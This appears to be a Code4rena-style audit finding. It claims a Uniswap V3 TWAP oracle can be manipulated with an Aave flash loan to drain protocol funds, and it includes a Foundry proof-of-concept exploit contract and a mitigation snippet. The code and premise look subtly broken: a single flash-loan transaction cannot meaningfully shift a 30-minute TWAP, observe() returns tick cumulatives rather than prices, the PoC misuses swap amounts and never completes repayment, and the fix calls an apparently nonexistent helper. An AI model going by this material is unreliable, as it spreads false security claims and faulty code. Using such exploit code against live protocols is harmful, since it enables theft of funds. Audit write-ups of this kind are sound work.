# Code4rena Finding Example

**Source:** Adapted from Code4rena contest reports

---

## `UniswapV3Oracle can be manipulated with flash loans to steal protocol funds`

**Impact:** An attacker can borrow tokens via flash loan, swap on Uniswap V3 to manipulate the TWAP price, borrow protocol funds at the manipulated price, and repay the flash loan. This results in direct loss of protocol funds with no capital requirement.

**Risk Rating:** HIGH

### Description
The `getPrice()` function uses a 30-minute TWAP from Uniswap V3. However, the function does not protect against flash loan price manipulation. An attacker can:

1. Borrow WETH via Aave flash loan
2. Swap on Uniswap V3 to shift the 30-minute TWAP
3. Call protocol functions using the manipulated price
4. Swap back and repay flash loan
5. Keep the profit

The vulnerability exists because:
- The 30-minute window is too short for large liquidity pools
- No minimum/maximum price bounds are enforced
- No check for recent large price movements

### Affected Code
**File:** `src/oracles/UniswapV3Oracle.sol`
**Lines:** 45-67

```solidity
function getPrice(address token) external view returns (uint256) {
    // @audit-issue: No protection against flash loan manipulation
    uint32 secondsAgo = 30 minutes;  // Too short for large pools
    uint32 oldestObservation = oracleObservations[token];

    (
        uint256 price0,
        uint256 price1,
    ) = IUniswapV3Pool(pool).observe(secondsAgo);

    uint256 twab = (price0 + price1) / 2;
    // @audit-issue: No min/max bounds on returned price
    return twab;
}
```

### Root Cause
1. **Insufficient TWAP window:** 30 minutes can be manipulated for pools with 100M+ liquidity
2. **No price deviation checks:** No comparison to "sanity" price bounds
3. **No flash loan detection:** No check for recent flash loan activity

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/oracles/UniswapV3Oracle.sol";
import "../src/Protocol.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@aave/v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";

contract FlashLoanPriceManipulation is Test, FlashLoanSimpleReceiverBase {
    UniswapV3Oracle oracle;
    Protocol protocol;
    IUniswapV3Pool pool;
    ERC20 token;

    function setUp() public {
        // Setup mainnet fork
        vm.createSelectFork(vm.rpcUrl("mainnet"), 18_500_000);

        oracle = UniswapV3Oracle(0x...);
        protocol = Protocol(0x...);
        pool = IUniswapV3Pool(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8); // USDC/WETH
        token = ERC20(pool.token0());
    }

    function testFlashLoanManipulation() public {
        uint256 initialBalance = token.balanceOf(address(this));
        uint256 poolBalance = token.balanceOf(address(pool));

        // Step 1: Borrow via Aave flash loan
        uint256 borrowAmount = 1_000_000 * 1e6; // 1M USDC
        POOL.flashLoanSimple(
            address(this),
            address(token),
            borrowAmount,
            "",
            0
        );

        uint256 profit = token.balanceOf(address(this)) - initialBalance;
        console2.log("Profit:", profit / 1e6, "USDC");

        assertGt(profit, 0, "Should make profit");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Step 2: Manipulate price
        token.approve(address(pool), type(uint256).max);

        // Swap to shift TWAP
        pool.swap(
            address(this),
            false, // zeroForOne
            amount / 2,
            0,
            ""
        );

        // Step 3: Use manipulated price to steal from protocol
        uint256 manipulatedPrice = oracle.getPrice(address(token));
        uint256 collateralNeeded = 100 * 1e18 * 1e18 / manipulatedPrice;

        protocol.deposit{value: collateralNeeded}();
        protocol.borrow(100 * 1e18);

        // Step 4: Swap back
        pool.swap(
            address(this),
            true, // zeroForOne
            type(uint256).max,
            0,
            ""
        );

        // Step 5: Repay flash loan
        uint256 repayAmount = amount + premium;
        token.approve(address(POOL), repayAmount);

        return true;
    }

    receive() external payable {}
}
```

### Recommended Mitigation

Implement multiple protective measures:

```solidity
uint256 constant MIN_PRICE = 1e14; // 0.0001 USD
uint256 constant MAX_PRICE = 1e26; // 10M USD
uint256 constant MIN_TREND = 24 hours; // Use 24h TWAP instead of 30m
uint256 constant MAX_DEVIATION = 50; // 50% deviation from chainlink

function getPrice(address token) external view returns (uint256) {
    // FIX 1: Use longer TWAP window
    (int256 tick24,) = OracleLibrary.getOldestObservation(pool);

    uint256 twapPrice = OracleLibrary.getQuoteAtTick(
        tick24,
        1e18,
        token0,
        token1
    );

    // FIX 2: Enforce price bounds
    require(twapPrice >= MIN_PRICE && twapPrice <= MAX_PRICE, "Price out of bounds");

    // FIX 3: Compare with Chainlink
    uint256 chainlinkPrice = chainlinkOracle.latestAnswer();
    uint256 deviation = twapPrice > chainlinkPrice
        ? (twapPrice - chainlinkPrice) * 100 / chainlinkPrice
        : (chainlinkPrice - twapPrice) * 100 / chainlinkPrice;

    require(deviation <= MAX_DEVIATION, "Price deviation too high");

    return twapPrice;
}
```
